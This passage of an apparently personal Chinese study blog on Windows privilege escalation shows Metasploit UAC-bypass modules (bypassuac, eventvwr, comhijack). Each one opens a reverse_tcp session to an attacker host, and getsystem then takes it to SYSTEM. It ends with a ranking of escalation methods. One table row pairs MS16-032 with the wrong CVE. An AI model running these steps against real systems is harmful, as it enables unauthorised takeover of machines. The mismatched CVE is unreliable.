+<h4 id="Step-4：验证"><a href="#Step-4：验证" class="headerlink" title="Step 4：验证"></a>Step 4：验证</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 攻击机 MSF 中</span></span><br><span class="line">msf6 &gt; sessions</span><br><span class="line">Active sessions</span><br><span class="line">Id Name Type Information</span><br><span class="line">1 meterpreter x64/windows NT AUTHORITY\NETWORK SERVICE @ WEBSERVER</span><br><span class="line">2 meterpreter x64/windows NT AUTHORITY\SYSTEM @ WEBSERVER ← 成功</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"><span class="comment"># 输出: Server username: NT AUTHORITY\SYSTEM</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="方法三：MSF-BypassUAC-无文件落地-✅"><a href="#方法三：MSF-BypassUAC-无文件落地-✅" class="headerlink" title="方法三：MSF BypassUAC(无文件落地 ✅)"></a>方法三：MSF BypassUAC(无文件落地 ✅)</h2><p>UAC 是什么？</p>
+<p><strong>UAC &#x3D; 用户账户控制（User Account Control）</strong> </p>
+<p>Windows 安全防护机制： 即便账号隶属于<strong>管理员组 Administrators</strong>，日常运行程序只会拿到<strong>受限管理员令牌</strong>； 一旦要修改系统核心配置、写入系统目录、安装程序，系统会弹出授权弹窗，用户点确认才会授予完整管理员权限。</p>
+<p>绕过这套弹窗校验的操作，就叫做 <strong>Bypass UAC（UAC 绕过）</strong></p>
+<h3 id="1-适用性说明"><a href="#1-适用性说明" class="headerlink" title="1. 适用性说明"></a>1. 适用性说明</h3><p>BypassUAC 生效必要条件：</p>
+<p>当前登录用户 必须属于本地 Administrators 管理员组</p>
+<ol>
+<li>✅ 可用场景：账号在管理员组，仅仅被 UAC 限制了权限</li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602727547_1tee2l.webp" loading='lazy'></p>
+<ol start="2">
+<li>❌ 不可用场景：当前权限是 NETWORK SERVICE、普通来宾用户、IIS默认程序池权限（不在管理员组）</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查当前用户是否在 Administrators 组</span></span><br><span class="line"><span class="built_in">whoami</span> /groups | findstr <span class="string">&quot;S-1-5-32-544&quot;</span></span><br><span class="line"><span class="comment"># 有输出 → 在 Administrators 组，BypassUAC 可用 ✓</span></span><br><span class="line"><span class="comment"># 无输出 → 不在 Administrators 组，BypassUAC 不可用 ✗</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Windows-Server-2008-R2-可用的-BypassUAC-模块"><a href="#2-Windows-Server-2008-R2-可用的-BypassUAC-模块" class="headerlink" title="2. Windows Server 2008 R2 可用的 BypassUAC 模块"></a>2. Windows Server 2008 R2 可用的 BypassUAC 模块</h3><table>
+<thead>
+<tr>
+<th align="center">模块</th>
+<th align="center">适用版本</th>
+<th align="center">原理</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">bypassuac</td>
+<td align="center">2008 R2 ✓</td>
+<td align="center">COM IFileOperation 劫持</td>
+</tr>
+<tr>
+<td align="center">bypassuac_fodhelper</td>
+<td align="center">Win10+</td>
+<td align="center">FodHelper 注册表劫持</td>
+</tr>
+<tr>
+<td align="center">bypassuac_eventvwr</td>
+<td align="center">2008 R2 ✓</td>
+<td align="center">事件查看器注册表劫持</td>
+</tr>
+<tr>
+<td align="center">bypassuac_comhijack</td>
+<td align="center">2008 R2 ✓</td>
+<td align="center">COM 接口劫持</td>
+</tr>
+<tr>
+<td align="center">bypassuac_injection</td>
+<td align="center">2008 R2 ✓</td>
+<td align="center">进程注入</td>
+</tr>
+</tbody></table>
+<p>bypassuac 和 bypassuac_eventvwr 在 Windows Server 2008 R2 上最稳定。</p>
+<h3 id="3-原理：bypassuac-模块"><a href="#3-原理：bypassuac-模块" class="headerlink" title="3. 原理：bypassuac 模块"></a>3. 原理：bypassuac 模块</h3><p>Windows 的 UAC 机制通过 IAccessible 接口和 IFileOperation COM 对象实现白名单程序提权。bypassuac 模块利用以下流程：</p>
+<ol>
+<li>当前账号属于管理员组，但是所持令牌被 UAC 裁剪，权限不全</li>
+<li>调用系统 COM 组件 IFileOperation，该组件默认会以高完整性级别（不受 UAC 限制）启动</li>
+<li>利用 COM 劫持 &#x2F; DLL 劫持技术，篡改组件调用逻辑</li>
+<li>高权限进程加载我们的恶意后门代码静默执行</li>
+<li>成功绕过弹窗校验，获取完整管理员权限</li>
+</ol>
+<h3 id="4-操作步骤-1"><a href="#4-操作步骤-1" class="headerlink" title="4. 操作步骤"></a>4. 操作步骤</h3><p>前提：当前 Meterpreter 会话的用户在 Administrators 组。</p>
+<h4 id="阶段-1：前置校验"><a href="#阶段-1：前置校验" class="headerlink" title="阶段 1：前置校验"></a>阶段 1：前置校验</h4><ol>
+<li>打开 meterpreter 会话，查看当前用户。</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>核查是否在管理员组</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">whoami</span> /groups | findstr S-1-5-32-544</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602729352_1acqp8.webp" loading='lazy'></p>
+<p>有输出 &#x3D; 符合条件，可以绕过 UAC</p>
+<ul>
+<li><code>whoami /groups</code>查看当前进程所属的全部用户权限组列表</li>
+<li><code>|</code>管道符：把前一条命令输出的所有文字，交给后面命令处理</li>
+<li><code>findstr</code>：Windows 自带字符串查找命令（等同于 Linux 里 grep）</li>
+</ul>
+<p>作用：在一堆文本里，检索是否包含 <code>S-1-5-32-544</code> 字符串</p>
+<ul>
+<li><code>S-1-5-32-544</code>：SID，对应本地管理员组 Administrators</li>
+</ul>
+<ol start="3">
+<li>把会话放到后台，退回MSF6控制台</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background</span><br></pre></td></tr></table></figure>
+
+<h4 id="阶段-2：UAC-绕过模块配置并执行"><a href="#阶段-2：UAC-绕过模块配置并执行" class="headerlink" title="阶段 2：UAC 绕过模块配置并执行"></a>阶段 2：UAC 绕过模块配置并执行</h4><p>Scenario A：直接在 Meterpreter 中使用 bypassuac</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加载基础UAC绕过模块</span></span><br><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逐项配置模块参数</span></span><br><span class="line"><span class="built_in">set</span> SESSION 1                      <span class="comment"># 指定后台存放的meterpreter会话序号</span></span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp  <span class="comment"># 64位系统反弹载荷</span></span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.23.131           <span class="comment"># 攻击机Kali本机IP（接收反弹会话）</span></span><br><span class="line"><span class="built_in">set</span> LPORT 9999                    <span class="comment"># 自定义监听端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行漏洞利用，静默绕过UAC</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>运行成功：MSF 会生成一条<strong>高完整性级别</strong>的全新 Meterpreter 会话。</p>
+<p>Scenario B：使用 bypassuac_eventvwr（事件查看器劫持）</p>
+<p>原理：劫持 eventvwr.msc 事件查看器启动时的注册表读取逻辑，高权限加载恶意载荷</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac_eventvwr</span><br><span class="line">set SESSION 1</span><br><span class="line">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.23.131</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>适配：Win7、Windows Server2008R2、早期 Win10 版本，老系统稳定性极强，新版 Windows 已被补丁修复</p>
+<p>Scenario C：使用 bypassuac_comhijack（COM 组件劫持）</p>
+<p>原理：劫持系统 COM 接口，利用系统进程权限上下文绕过 UAC 校验</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac_comhijack</span><br><span class="line">set SESSION 1</span><br><span class="line">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.23.131</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>适配范围最广，未加固的 Win10&#x2F;Win11 均可尝试，实战渗透最常用</p>
+<h4 id="阶段-3：最终提权至-SYSTEM-权限验证"><a href="#阶段-3：最终提权至-SYSTEM-权限验证" class="headerlink" title="阶段 3：最终提权至 SYSTEM + 权限验证"></a>阶段 3：最终提权至 SYSTEM + 权限验证</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 查看当前身份：用户名不变，但权限完整性已提升</span></span><br><span class="line">getuid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 通过管道模拟技术提升至SYSTEM最高权限</span></span><br><span class="line">getsystem</span><br><span class="line"><span class="comment"># 成功回显：got system via technique 1 (Named Pipe Impersonation)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 最终核验系统权限</span></span><br><span class="line">getuid</span><br><span class="line"><span class="comment"># 最终结果：NT AUTHORITY\SYSTEM</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-两种提权路线"><a href="#5-两种提权路线" class="headerlink" title="5. 两种提权路线"></a>5. 两种提权路线</h3><p><strong>路线 1：低权限身份（NETWORK SERVICE）→ 直达 SYSTEM</strong></p>
+<p>无需接触 UAC，完全绕开这套机制</p>
+<p>两种方式任选其一：</p>
+<ol>
+<li>JuicyPotato&#x2F;SweetPotato 土豆系列令牌模拟提权</li>
+<li>MS16-032 内核条件竞争漏洞提权</li>
+</ol>
+<p>最终直接拿到系统最高权限 NT AUTHORITY\SYSTEM</p>
+<p><strong>路线 2：受限管理员 → BypassUAC → 完整管理员 → getsystem → SYSTEM</strong></p>
+<p>适用：已经拿到管理员账号，但被 UAC 拦截，无法执行系统级操作</p>
+<p>步骤：</p>
+<ol>
+<li>MSF 内置模块绕过 UAC，提升进程完整性级别</li>
+<li>使用 getsystem 命令，进一步提升至 SYSTEM 权限</li>
+</ol>
+<h2 id="方法总结与优先级"><a href="#方法总结与优先级" class="headerlink" title="方法总结与优先级"></a>方法总结与优先级</h2><table>
+<thead>
+<tr>
+<th align="center">优先级</th>
+<th align="center">提权方案</th>
+<th align="center">是否无文件落地</th>
+<th align="center">前置适用条件</th>
+<th align="center">系统版本范围</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="center">MSF Reflection（令牌反射提权）</td>
+<td align="center">✅ 纯内存执行，不写入磁盘</td>
+<td align="center">账户拥有 <code>SeImpersonatePrivilege</code><br/>（模拟权限）NETWORK SERVICE&#x2F;IIS 默认自带此权限</td>
+<td align="center">Win7~Win10 全版本、服务器系统通用</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="center">MS16-032（CVE-2016-3309 内核漏洞）</td>
+<td align="center">✅ 可通过 PowerShell 内存加载，无落地</td>
+<td align="center">目标未安装安全补丁 <strong>KB3139914</strong></td>
+<td align="center">仅 Win7、Windows Server 2008 R2 老旧未打补丁系统</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="center">BypassUAC 系列（eventvwr&#x2F;comhijack&#x2F; 原版）</td>
+<td align="center">✅ MSF 内存载荷，无需上传程序</td>
+<td align="center">当前用户归属 <strong>Administrators 管理员组</strong></td>
+<td align="center">Win7 ~ Win11 主流 Windows 系统</td>
+</tr>
+<tr>
+<td align="center">备选兜底</td>
+<td align="center">JuicyPotato &#x2F; SweetPotato（土豆系列）</td>
+<td align="center">❌ 必须上传 EXE 程序落地磁盘运行</td>
+<td align="center">账户具备<code>SeImpersonatePrivilege</code><br/>模拟权限</td>
+<td align="center">Win7 ~ Win10 全版本</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>本文为个人学习笔记，如有错误或疏漏，欢迎批评指正。</p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%8F%90%E6%9D%83/">提权</a></div><div class="post-share"><div class="social-share" data-image="/img/photo.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/08/13/CCF-2026/index/" title="CCF 2026.6"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">CCF 2026.6</div></div><div class="info-2"><div class="info-item-1">CCF 2026 应急响应赛题题解（冰蝎后门、SSH异常登录、RDP爆破、SQL注入、DNS外带、Shiro反序列化）</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/photo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="author-info-name">Jasmine_Iris</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Jasmineee007"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Jasmineee007" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://gitee.com/jasminee0762" target="_blank" title="Gitee"><i class="fab fa-gitee" style="color: #c71d23;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客~ 📝<br/><hr/>最近更新：2026-08-13<br/><br/>新增文章：<br/><a href="/2026/08/13/Windows-%E6%8F%90%E6%9D%83/index/">Windows 提权</a><br/><a href="/2026/08/13/CCF-2026/index/">CCF 2026.6</a><br/><a href="/2026/08/13/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index/">流量分析</a><br/></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E8%9A%81%E5%89%91-Webshell-%E8%BD%AC%E7%A7%BB%E8%87%B3-Metasploit"><span class="toc-text">1. 蚁剑 Webshell 转移至 Metasploit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BD%AC-MSF%EF%BC%9F"><span class="toc-text">1.1 为什么要转 MSF？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%A6%82%E4%BD%95%E5%B0%86-%E8%9A%81%E5%89%91-Webshell-%E8%BD%AC%E7%A7%BB%E8%87%B3-MSF%EF%BC%9F"><span class="toc-text">2. 如何将 蚁剑 Webshell 转移至 MSF？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%8E%AF%E5%A2%83%E8%AF%B4%E6%98%8E"><span class="toc-text">前置环境说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5%E4%B8%80%EF%BC%9A%E6%8B%BF%E5%88%B0-Web-%E5%85%A5%E5%8F%A3%EF%BC%88%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%EF%BC%89"><span class="toc-text">阶段一：拿到 Web 入口（蚁剑连接）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5%E4%BA%8C%EF%BC%9A%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F%E8%8E%B7%E5%8F%96-Meterpreter"><span class="toc-text">阶段二：两种方式获取 Meterpreter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache2-vs-Python%E4%B8%B4%E6%97%B6HTTP%E6%9C%8D%E5%8A%A1"><span class="toc-text">Apache2  vs Python临时HTTP服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E5%B1%9E%E6%80%A7%E5%B7%AE%E5%BC%82"><span class="toc-text">一、基础属性差异</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%BF%90%E8%A1%8C%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-text">二、运行生命周期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E7%9B%B8%E5%90%8C%E7%82%B9"><span class="toc-text">三、相同点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5%E4%B8%89%EF%BC%9AMeterpreter-%E4%BC%9A%E8%AF%9D%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C"><span class="toc-text">阶段三：Meterpreter 会话基础操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5%E5%9B%9B%EF%BC%9AWindows-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83"><span class="toc-text">阶段四：Windows 本地提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5%E4%BA%94%EF%BC%9A%E6%8F%90%E6%9D%83%E5%90%8E%E5%90%8E%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C"><span class="toc-text">阶段五：提权后后渗透操作</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E6%8F%90%E6%9D%83"><span class="toc-text">3. 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9AToken-%E6%A8%A1%E6%8B%9F-SweetPotato-JuicyPotato"><span class="toc-text">方法一：Token 模拟(SweetPotato &#x2F; JuicyPotato)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-JuicyPotato-SweetPotato-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">1. JuicyPotato&#x2F;SweetPotato 是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-%E5%9F%BA%E7%A1%80%E5%85%B1%E6%80%A7"><span class="toc-text">1.1 基础共性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-JuicyPotato%EF%BC%88%E5%A4%9A%E6%B1%81%E5%9C%9F%E8%B1%86%EF%BC%89"><span class="toc-text">1.2 JuicyPotato（多汁土豆）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-SweetPotato%EF%BC%88%E7%94%9C%E5%9C%9F%E8%B1%86%EF%BC%89"><span class="toc-text">1.3 SweetPotato（甜土豆）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-%E5%AF%B9%E6%AF%94"><span class="toc-text">1.4 对比</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-5-%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E4%B8%AD%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-text">1.5 渗透流程中的位置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%80%82%E7%94%A8%E6%80%A7%E9%AA%8C%E8%AF%81"><span class="toc-text">2. 适用性验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">3. 漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-%E8%BF%99%E4%B8%8D%E6%98%AFBug%EF%BC%8C%E6%98%AF%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7"><span class="toc-text">3.1 这不是Bug，是设计缺陷</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-SeImpersonatePrivilege-%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AF%E2%80%9D%E6%BC%8F%E6%B4%9E%E2%80%9D"><span class="toc-text">3.2 SeImpersonatePrivilege 为什么是”漏洞”</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83%E5%AE%8C%E6%95%B4%E6%9D%83%E9%99%90%E6%B5%81%E8%BD%AC"><span class="toc-text">4. 土豆提权完整权限流转</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#T0-%E5%88%9D%E5%A7%8B%E7%8A%B6%E6%80%81%EF%BC%88%E6%8F%90%E6%9D%83%E5%89%8D%E7%BD%AE%E6%9D%A1%E4%BB%B6%EF%BC%89"><span class="toc-text">T0 初始状态（提权前置条件）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#T1%EF%BC%9A%E6%94%BB%E5%87%BB%E8%80%85%E6%90%AD%E5%BB%BA%E6%8E%A5%E6%94%B6%E9%80%9A%E9%81%93"><span class="toc-text">T1：攻击者搭建接收通道</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#T2%EF%BC%9A%E8%B0%83%E7%94%A8COM%E6%8E%A5%E5%8F%A3%EF%BC%8C%E5%94%A4%E8%B5%B7SYSTEM%E6%9D%83%E9%99%90%E8%BF%9B%E7%A8%8B"><span class="toc-text">T2：调用COM接口，唤起SYSTEM权限进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#T3%EF%BC%9ASYSTEM%E8%BF%9B%E7%A8%8B%E6%8E%A5%E5%85%A5%E7%AE%A1%E9%81%93%EF%BC%8C%E7%AA%83%E5%8F%96%E8%BA%AB%E4%BB%BD%E4%BB%A4%E7%89%8C"><span class="toc-text">T3：SYSTEM进程接入管道，窃取身份令牌</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#T4%EF%BC%9A%E5%A4%8D%E5%88%B6%E4%BB%A4%E7%89%8C%EF%BC%8C%E8%BD%AC%E6%8D%A2%E4%B8%BA%E8%BF%9B%E7%A8%8B%E4%B8%BB%E4%BB%A4%E7%89%8C"><span class="toc-text">T4：复制令牌，转换为进程主令牌</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#T5%EF%BC%9A%E4%BD%BF%E7%94%A8SYSTEM%E4%BB%A4%E7%89%8C%E5%90%AF%E5%8A%A8%E6%96%B0%E7%A8%8B%E5%BA%8F%EF%BC%8C%E6%8F%90%E6%9D%83%E6%94%B6%E5%B0%BE"><span class="toc-text">T5：使用SYSTEM令牌启动新程序，提权收尾</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%AE%9E%E6%93%8D%E6%B5%81%E7%A8%8B"><span class="toc-text">5. 实操流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%A1%88-A%EF%BC%9AMSF-ms16-075-reflection-juicy-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0"><span class="toc-text">方案 A：MSF ms16_075_reflection_juicy (无文件落地 )</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%A1%88-B%EF%BC%9AJuicyPotato-%E4%BC%A0%E7%BB%9F%E7%89%88-%E6%9C%89%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E2%9D%8C"><span class="toc-text">方案 B：JuicyPotato 传统版(有文件落地 ❌)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%8A%A8%E9%9D%99%E5%88%86%E6%9E%90"><span class="toc-text">6. 动静分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="toc-text">7. 常见问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9AMS16-032-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0"><span class="toc-text">方法二：MS16-032 内核漏洞(无文件落地)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%80%82%E7%94%A8%E6%80%A7%E9%AA%8C%E8%AF%81"><span class="toc-text">1. 适用性验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8E%9F%E7%90%86"><span class="toc-text">2. 原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%A0%B8%E5%BF%83%E6%97%A0%E6%96%87%E4%BB%B6%E5%8E%9F%E7%90%86"><span class="toc-text">3. 核心无文件原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%93%8D%E4%BD%9C%E6%AD%A5%E9%AA%A4"><span class="toc-text">4. 操作步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Step-1%EF%BC%9A%E8%9A%81%E5%89%91%E4%BD%8E%E6%9D%83%E9%99%90%E4%BC%9A%E8%AF%9D%E8%BF%81%E7%A7%BB%E5%88%B0MSF"><span class="toc-text">Step 1：蚁剑低权限会话迁移到MSF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Step-2%EF%BC%9AKali-%E6%94%BB%E5%87%BB%E6%9C%BA%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87"><span class="toc-text">Step 2：Kali 攻击机前期准备</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Step-3%EF%BC%9A%E5%9C%A8%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">Step 3：在目标服务器执行命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Step-4%EF%BC%9A%E9%AA%8C%E8%AF%81"><span class="toc-text">Step 4：验证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9AMSF-BypassUAC-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E2%9C%85"><span class="toc-text">方法三：MSF BypassUAC(无文件落地 ✅)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%80%82%E7%94%A8%E6%80%A7%E8%AF%B4%E6%98%8E"><span class="toc-text">1. 适用性说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Windows-Server-2008-R2-%E5%8F%AF%E7%94%A8%E7%9A%84-BypassUAC-%E6%A8%A1%E5%9D%97"><span class="toc-text">2. Windows Server 2008 R2 可用的 BypassUAC 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8E%9F%E7%90%86%EF%BC%9Abypassuac-%E6%A8%A1%E5%9D%97"><span class="toc-text">3. 原理：bypassuac 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%93%8D%E4%BD%9C%E6%AD%A5%E9%AA%A4-1"><span class="toc-text">4. 操作步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-1%EF%BC%9A%E5%89%8D%E7%BD%AE%E6%A0%A1%E9%AA%8C"><span class="toc-text">阶段 1：前置校验</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 